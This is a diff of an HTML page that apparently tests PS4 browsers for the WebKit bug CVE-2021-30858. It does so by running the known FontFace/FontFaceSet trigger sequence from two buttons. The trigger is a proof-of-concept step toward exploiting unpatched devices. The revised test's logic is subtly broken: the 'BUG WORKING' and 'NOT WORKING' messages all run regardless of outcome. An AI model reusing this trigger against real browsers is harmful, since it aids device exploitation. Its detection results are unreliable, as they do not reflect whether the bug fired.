@@ -6,37 +6,54 @@
             try{
             alert("Testing CVE-2021-30858 on PS4 Browser.. Press OK to check bug API!!!");
             let font = new FontFace('font1', 'url()',{});
-            alert("FontFace(). OK!!");
+            alert("FontFace(). OK.");
             var fontFaceSet = new FontFaceSet([font]);
-            alert("FontFaceSet(). OK!!");
-            
+            alert("FontFaceSet(). OK.");
             font.family = 'font2';
-            alert("CVE-2021-30858 Webkit exploit bug.. FontFaceSet() and FontFace() are available on PS4 Browser :P!!");
+            document.getElementById("test").innerHTML = "FontFace() API are available on PS4 Browser";
+            alert("CVE-2021-30858 Webkit exploit bug.. FontFaceSet() and FontFace() API are available on PS4 Browser :P!!");
               }
             catch(e){
-                alert(e);
+                alert(e.message);
             }
         }
 
-        async function testwebkit2() {
-            try{
-            alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n This should not give you any 'Memory Errors'.\n If 'Bug Patched' Msgs or 'Memory Error Msg' is show means this bug does not work on your current FW and has been patched!!!\nIf you get 'The String did not match the expected pattern it's OK, Means it's working as expected! :P '");
-            let font = new FontFace('font1','',{});
-            var fontFaceSet = new FontFaceSet([font]);
-            font.family = 'font2';
-            alert("Bug Patched :(");
-               }
-            catch(e){
-                alert(e);
+         function testwebkit2() {
+            
+            alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n If you receive 'there's no enought memory error msgs' means the Bug is patched.");
+            let font = new FontFace("font1", '', {},ConfirmWork1());
+            
+            var fontFaceSet = new FontFaceSet([font],ConfirmWork2());
+            
+            font.family = "font2";
+            //do something after the font is loaded
+            NotWork();
+            alert("webkit exploit patched !");
+        }
+
+            function ConfirmWork1() {
+            
+            document.getElementById("test").innerHTML = "FaceFont()..OK.BUG WORKING!!!";
+
             }
-}
+
+            function ConfirmWork2() {
+            
+            document.getElementById("test").innerHTML = "FaceFontSet()..OK.BUG WORKING!!!";
+
+            }
+
+        function NotWork() {
+            
+            document.getElementById("test").innerHTML = "If you see this Msg means: BUG IS NOT WORKING OR PATCHED!!!";
+           }
 
     </script>
 
     <body>
         <button onclick="testwebkit()">Test CVE Bug API On PS4 FW</button>
         <button onclick="testwebkit2()">Test Bug On 8.XX FW</button>
+        <p id="test">Bug Result Test...</p>
     </body>
 
 </html>
-
